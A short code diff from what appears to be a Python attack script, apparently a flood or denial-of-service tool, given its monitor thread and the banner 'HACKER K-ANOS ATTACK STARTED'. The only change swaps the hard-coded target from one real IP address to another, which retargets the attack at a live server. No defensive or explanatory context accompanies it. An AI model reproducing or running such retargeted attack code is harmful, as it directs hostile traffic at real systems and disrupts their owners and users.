@@ -714,7 +714,7 @@ class MonitorThread(threading.Thread):
 #execute 
 print ("-- HACKER K-ANOS ATTACK STARTED --")
 set_safe()
-url = 'http://144.76.74.73'
+url = 'http://62.122.207.157'
 if url.count("/")==2:
     url = url + "/"
 m = re.search('http\://([^/]*)/?.*', url)
